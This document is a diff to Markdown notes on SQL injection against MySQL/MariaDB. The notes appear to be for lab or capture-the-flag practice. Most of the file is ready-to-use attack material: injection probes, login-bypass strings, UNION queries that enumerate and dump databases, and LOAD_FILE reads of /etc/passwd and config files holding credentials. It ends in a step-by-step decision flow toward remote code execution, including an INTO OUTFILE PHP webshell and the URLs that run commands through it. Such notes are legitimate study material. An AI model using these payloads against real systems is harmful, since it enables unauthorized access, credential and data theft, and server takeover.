@@ -1,145 +1,149 @@
 # SQL Injection Methodology
 
-**DB focus:** MySQL / MariaDB  
-**Key tool:** mysql CLI, Burp Suite, manual UNION injection
+**Core principle:** Simple → Complex. Exhaust simple options before advancing. Test EVERY input field, not just the obvious ones.
 
 ---
 
-## Phase 1 — Discovery
+## Step 1 — Map ALL Input Fields
 
-### Test for injection
-Inject a single quote into every input field and observe response:
-- `500 Internal Server Error` → SQL syntax error → injectable
-- `302` with error message → query ran fine, wrong input
-- No change → likely parameterized (confirm with SLEEP)
+Before testing anything, find every field that touches the database:
+- Login forms (username, password)
+- Registration forms (all fields — including invitation codes, referral codes)
+- Search bars
+- Profile/settings fields
+- URL parameters (`?id=1`, `?page=home`, `?search=term`)
+- Hidden POST fields
 
-### Confirm with SLEEP (time-based check)
-```bash
-# If response takes 5+ seconds, injection is confirmed
-# If response is fast (~0.4s), field is likely parameterized
+**Don't fixate on the obvious field. The injection point is often NOT the login.**
+
+---
+
+## Step 2 — Probe Each Field with a Single Quote
+
+Test every field with `'` and observe the response:
+
+| Response | Meaning |
+|----------|---------|
+| `500 Internal Server Error` | SQL syntax error → **injectable** |
+| Different page behavior / error message | Possibly injectable |
+| `302` redirect with "wrong/invalid" message | Query ran fine, wrong value — NOT injectable here |
+| No change | Likely parameterized |
+
+**If unsure, confirm with SLEEP:**
+```
 ' OR SLEEP(5)-- -
 ```
+- Response takes 5+ seconds → confirmed injectable
+- Response is fast (~0.4s) → parameterized, move on
 
 ---
 
-## Phase 2 — Auth Bypass (Login)
+## Step 3 — Auth Bypass (Simple to Complex)
 
-### Comment-based bypass (when username is known)
+Try these in order, stop when one works:
+
 ```sql
+-- 1. Comment out the password check (simplest)
 admin'-- -
-admin')-- -    -- use if query has parentheses: WHERE (username='...')
-```
+admin' #
 
-### OR-based bypass
-```sql
-' OR '1'='1        -- no comment needed, uses original closing quote
-' OR 1=1-- -
+-- 2. Comment with parenthesis close (if query uses parens)
+admin')-- -
+
+-- 3. OR bypass — no comment needed (uses original closing quote)
+' OR '1'='1
 admin' OR '1'='1
+
+-- 4. OR bypass with comment
+' OR 1=1-- -
+admin' OR 1=1-- -
+
+-- 5. OR in both fields
+username: anything
+password: ' OR '1'='1
+
+-- 6. Target specific user by ID
+' OR id=1)-- -
 ```
 
-**Operator precedence note:** AND evaluates before OR. If query is:
-`WHERE username='X' OR '1'='1' AND password='Y'`  
-The AND fires first (true AND false = false), then OR fires (X OR false).  
-To bypass fully, inject OR into the password field too, or use comment to drop the AND.
-
-### Parenthesis bypass
-If query wraps conditions in parens: `WHERE (username='...' AND id > 1) AND password='...'`
-```sql
-admin')-- -       -- close the paren, comment out the rest
-' OR id=5)-- -    -- log in as specific user ID
+**For non-login fields (invitation codes, access codes):**
+- Some fields validate format BEFORE SQL — prefix injection with valid-looking data:
 ```
-
-### Invitation code / hidden field bypass
-If a registration or access form checks a code against a DB:
-```sql
--- Keep valid-format prefix, inject after it, use closing quote pattern
-aaaa-bbbb-1111' or '1'='1
+xxxx-xxxx-1111' OR '1'='1
 ```
-The original query's closing quote closes the injected string — no comment needed.  
-**Why this works:** `WHERE code='aaaa-bbbb-1111' or '1'='1'` is always true.
+- The `' OR '1'='1` pattern (no comment) is often more reliable than `-- -` on these fields
 
 ---
 
-## Phase 3 — UNION Injection
+## Step 4 — UNION Injection
 
-### Step 1: Count columns with ORDER BY
+Only attempt after confirming the field is injectable AND output is reflected on the page.
+
+### 4a. Count columns (ORDER BY method)
 ```sql
-' ORDER BY 1-- -   -- works → at least 1 column
-' ORDER BY 2-- -   -- works → at least 2 columns
-' ORDER BY 5-- -   -- error → table has 4 columns
+' ORDER BY 1-- -    → works
+' ORDER BY 2-- -    → works
+' ORDER BY 3-- -    → error = 2 columns
 ```
 
-### Step 2: Find visible columns
+### 4b. Find visible columns
 ```sql
-' UNION SELECT 1,2,3,4-- -
--- Look at page output — which numbers appear? Those columns are printed.
+' UNION SELECT 1,2,3-- -
+-- Look at page output — which numbers appear?
 ```
 
-### Step 3: Enumerate DB
+### 4c. Enumerate DB
 ```sql
 -- Current database
-' UNION SELECT 1,2,database(),4-- -
+' UNION SELECT 1,database(),3-- -
 
 -- All databases
-' UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION SELECT 1,schema_name,3 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 
--- Tables in a database
-' UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'-- -
+-- Tables in target DB
+' UNION SELECT 1,TABLE_NAME,3 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'-- -
 
--- Columns in a table
-' UNION SELECT 1,2,COLUMN_NAME,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'-- -
+-- Columns in target table
+' UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'-- -
 
 -- Dump data
-' UNION SELECT 1,2,column1,4 FROM dbname.tablename-- -
-' UNION SELECT 1,2,column1,4 FROM dbname.tablename WHERE col='value'-- -
+' UNION SELECT 1,column1,3 FROM dbname.tablename-- -
+' UNION SELECT 1,column1,3 FROM dbname.tablename WHERE col='value'-- -
 ```
 
 ---
 
-## Phase 4 — File Read
+## Step 5 — File Read
 
-### Check privileges first
+### Check privileges
 ```sql
--- Current user
-' UNION SELECT 1,2,user(),4-- -
-
--- Super privilege
-' UNION SELECT 1,2,super_priv,4 FROM mysql.user WHERE user="root"-- -
-
--- FILE privilege
-' UNION SELECT 1,2,privilege_type,4 FROM information_schema.user_privileges WHERE grantee="'user'@'host'"-- -
-```
-
-### Check secure_file_priv
-```sql
-' UNION SELECT 1,2,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
--- Empty value = can read/write anywhere
--- NULL = cannot read/write
--- Path = restricted to that directory
+' UNION SELECT 1,user(),3-- -
+' UNION SELECT 1,privilege_type,3 FROM information_schema.user_privileges WHERE grantee="'user'@'host'"-- -
+' UNION SELECT 1,variable_value,3 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
+-- Empty value = read/write anywhere. NULL = blocked.
 ```
 
 ### Read files
 ```sql
-' UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
-' UNION SELECT 1,2,LOAD_FILE("/var/www/html/config.php"),4-- -
+' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3-- -
 
 -- Find web root via server config:
-' UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
-' UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
-' UNION SELECT 1,2,LOAD_FILE("/etc/apache2/apache2.conf"),4-- -
+' UNION SELECT 1,LOAD_FILE("/etc/nginx/sites-enabled/default"),3-- -
+' UNION SELECT 1,LOAD_FILE("/etc/apache2/apache2.conf"),3-- -
+
+-- Read app source for DB credentials:
+' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3-- -
 ```
 
 ---
 
-## Phase 5 — File Write / RCE
+## Step 6 — File Write / RCE
 
-### Write webshell
 ```sql
-' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
-```
+-- Write webshell
+' UNION SELECT "","<?php system($_REQUEST[0]); ?>","" INTO OUTFILE '/var/www/html/shell.php'-- -
 
-### Execute commands
-```
+-- Execute commands
 http://<TARGET>/shell.php?0=id
 http://<TARGET>/shell.php?0=find / -name "flag_*" 2>/dev/null
 http://<TARGET>/shell.php?0=cat /path/to/flag.txt
@@ -147,24 +151,37 @@ http://<TARGET>/shell.php?0=cat /path/to/flag.txt
 
 ---
 
-## MySQL Fingerprinting
+## Decision Flow
 
-| Payload | Expected output |
-|---------|----------------|
-| `SELECT @@version` | MySQL/MariaDB version string |
-| `SELECT POW(1,1)` | `1` |
-| `SELECT SLEEP(5)` | 5 second delay |
+```
+For EVERY input field:
+  └─ Inject ' → 500 or behavior change?
+       ├─ No  → Confirm with SLEEP → still no? → parameterized, SKIP
+       └─ Yes → Try auth bypass payloads (simple to complex)
+                └─ Bypass works? → Explore app, find more injection points
+                └─ Need data extraction? → Count columns → UNION inject
+                     └─ Have FILE privilege? → LOAD_FILE → find web root
+                          └─ secure_file_priv empty? → write shell → RCE
+```
 
 ---
 
-## curl Reference
+## Burp Repeater Tips
 
-```bash
-# Connect to MySQL directly
-mysql -u root -ppassword -h <TARGET> -P <PORT> --skip-ssl
+- Use Repeater to edit POST body directly — avoids URL-encoding mistakes from browser forms
+- Watch full response body, not just status code
+- Test one payload at a time, note what changes
+- If a field validates format (e.g. `xxxx-xxxx-xxxx`), keep that format and inject AFTER it
 
-# Common queries
-mysql ... -e "show databases;"
-mysql ... -e "SELECT * FROM db.table;"
-mysql ... -e "SELECT COUNT(*) FROM (SELECT * FROM t1 UNION SELECT ...) AS x;"
-```
+---
+
+## Common Pitfalls
+
+| Pitfall | Fix |
+|---------|-----|
+| Stuck on login, ignoring other fields | Test ALL fields first |
+| OR 1=1 gives 500 | Table may be empty OR a second query re-uses injected input — try `' OR '1'='1` without comment |
+| UNION gives 500 | Wrong column count — use ORDER BY to count first |
+| `-- -` comment not working | Try `#` or use `' OR '1'='1` (no comment needed) |
+| Injection payload URL-encoded by browser | Use Burp Repeater to edit raw POST body |
+| Valid-format field rejecting payloads | Prefix with valid-format string before injecting |
